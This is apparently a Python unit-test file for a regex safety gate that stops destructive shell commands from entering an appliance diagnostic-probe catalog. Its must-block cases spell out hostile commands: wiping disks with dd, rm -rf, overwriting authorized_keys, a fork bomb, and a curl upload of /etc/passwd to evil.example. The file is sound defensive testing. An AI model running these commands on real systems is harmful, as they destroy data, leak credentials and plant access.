"""Unit test for the diagnostic-probe safety regex (Phase 15 A-spec).

The round-table QA audit called out: "the regex safety gate that you
did unit-test in an ad-hoc one-liner but never checked in." This file
makes it a persisted CI regression fence.

_DANGEROUS_SUBSTR_RE is the belt-and-suspenders backend check on the
probe catalog. The daemon has its own command handler; this regex
exists so a future commit that accidentally adds a destructive command
to PROBE_CATALOG fails loud at the backend validator, BEFORE it reaches
an appliance.

Must ALLOW (Phase 12 probe-catalog patterns):
  - `2>&1` stderr redirect
  - `2>/dev/null`
  - `| head`, `| tail`, `| grep` pipes
  - `timeout 5s <cmd>` bounded execution

Must BLOCK:
  - `> /tmp/file`                 file-destination redirect
  - `>> /path`                    append redirect
  - `rm `, `mv `, `cp `, `dd `    disk-modifying commands
  - `/dev/sda=`                   explicit block-device assignment
  - `curl ... --upload-file`      egress via curl
  - `:() {`                       fork-bomb signature
"""
from __future__ import annotations

import pytest


def test_import_regex():
    from diagnostic_probes import _DANGEROUS_SUBSTR_RE
    assert _DANGEROUS_SUBSTR_RE is not None


# ─── Must-allow cases (existing probe catalog uses these) ────────


@pytest.mark.parametrize("safe_cmd", [
    "timeout 5s wg show 2>&1",
    "timeout 3s systemctl status something 2>/dev/null",
    "timeout 5s journalctl -u sshd -n 100 --no-pager 2>&1 | tail -50",
    "timeout 2s cat /var/lib/msp/reboot_source 2>/dev/null || echo '(none)'",
    "echo '---'; timeout 5s wg show 2>&1",
    # Common PHI-safe telemetry idioms
    "df -h / | head -5",
    "ps aux | grep -v grep | grep appliance-daemon",
])
def test_safe_commands_not_flagged(safe_cmd):
    from diagnostic_probes import _DANGEROUS_SUBSTR_RE
    match = _DANGEROUS_SUBSTR_RE.search(safe_cmd)
    assert match is None, (
        f"Safe command incorrectly flagged as dangerous: {safe_cmd!r}\n"
        f"Matched substring: {match.group()!r}"
    )


# ─── Must-block cases (adversarial) ──────────────────────────────


@pytest.mark.parametrize("unsafe_cmd,reason", [
    # File-destination redirects
    ("cat /etc/passwd > /tmp/exfil", "file redirect"),
    ("echo malicious > /root/.ssh/authorized_keys", "authorized_keys write"),
    ("ls > /var/log/audit.log", "log overwrite"),
    # Append redirects
    ("echo foo >> /etc/hosts", "append redirect"),
    ("ls >> /tmp/log", "append redirect to arbitrary file"),
    # Disk-modifying commands
    ("rm -rf /var/lib/msp", "rm"),
    ("rm /etc/shadow", "rm of critical file"),
    ("mv /etc/shadow /tmp/shadow.bak", "mv"),
    ("cp /etc/shadow /tmp/shadow.bak", "cp of secrets"),
    ("dd if=/dev/urandom of=/dev/sda bs=1M", "dd"),
    # Block-device assignment
    ("/dev/sda=garbage", "/dev/sd assignment"),
    # Upload attempts
    ("curl https://evil.example --upload-file /etc/passwd", "curl upload"),
    # Fork bomb
    (":() { :|:& };:", "fork bomb"),
])
def test_unsafe_commands_flagged(unsafe_cmd, reason):
    from diagnostic_probes import _DANGEROUS_SUBSTR_RE
    match = _DANGEROUS_SUBSTR_RE.search(unsafe_cmd)
    assert match is not None, (
        f"Unsafe command NOT flagged ({reason}): {unsafe_cmd!r}\n"
        "The safety regex has a gap — either tighten the regex or add "
        "a more-specific rule. Never relax without a security review."
    )


# ─── Real-catalog sanity pass ─────────────────────────────────────


def test_catalog_is_free_of_dangerous_patterns():
    """Belt-and-suspenders self-test: every command in the actual
    PROBE_CATALOG must pass the safety regex. If this fails, a future
    commit added a dangerous probe and must be reverted or rewritten.
    """
    from diagnostic_probes import PROBE_CATALOG, _DANGEROUS_SUBSTR_RE
    for probe_name, spec in PROBE_CATALOG.items():
        cmd = spec["command"]
        match = _DANGEROUS_SUBSTR_RE.search(cmd)
        assert match is None, (
            f"Probe {probe_name!r} has dangerous pattern: "
            f"{match.group()!r} in command {cmd!r}"
        )


# ─── Adding a new probe is documented in code ────────────────────


def test_catalog_all_entries_have_required_fields():
    """Every probe must declare description + command + category.
    Missing fields would break the /api/admin/probes listing."""
    from diagnostic_probes import PROBE_CATALOG
    for name, spec in PROBE_CATALOG.items():
        for field in ("description", "command", "category"):
            assert field in spec, (
                f"Probe {name!r} missing required field {field!r}"
            )
        assert isinstance(spec["command"], str)
        assert "timeout" in spec["command"], (
            f"Probe {name!r} must use `timeout` to bound execution — "
            f"unbounded probes can hang the agent and are forbidden."
        )
